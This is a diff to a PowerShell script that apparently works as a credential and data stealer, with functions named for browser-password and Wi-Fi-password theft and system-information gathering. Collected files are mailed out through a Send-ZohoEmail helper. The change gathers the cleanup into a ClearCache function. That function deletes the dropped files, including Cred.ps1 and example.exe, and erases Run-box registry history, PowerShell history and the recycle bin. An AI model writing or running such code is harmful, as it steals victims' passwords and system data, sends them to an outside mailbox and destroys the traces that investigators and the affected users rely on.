@@ -177,10 +177,6 @@ function RunWBPV {
                 }
         }
 
-        Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
         Write-Host "Operation $step / $totalSteps is done."
         SetEmailSentFalse
 }
@@ -243,7 +239,6 @@ function GetWifiPasswords {
 
     }
 
-    Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
     SetEmailSentFalse
 }
 function GatherSystemInfo {
@@ -262,10 +257,7 @@ function GatherSystemInfo {
         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
-    Remove-Item "$sysInfoDir\computer_info.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$sysInfoDir\process_list.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$sysInfoDir\service_list.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$sysInfoDir\network_config.txt" -Force -ErrorAction SilentlyContinue
+    
     SetEmailSentFalse
 }
 function ShowTree {
@@ -297,8 +289,33 @@ function ShowTree {
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
 
-    Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
     SetEmailSentFalse
+}
+function ClearCache {
+
+    # RunWBPV
+    Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+    # GetWifiPasswords
+    Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
+    # GatherSystemInfo
+    Remove-Item "$sysInfoDir\computer_info.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\process_list.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\service_list.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$sysInfoDir\network_config.txt" -Force -ErrorAction SilentlyContinue
+    # ShowTree
+    Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
+
+    # Delete run box history
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+    # Delete powershell history
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+    # Deletes contents of recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 for ($step = 1; $step -le $totalSteps; $step++) {
@@ -312,14 +329,4 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     }
 }
 
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ClearCache
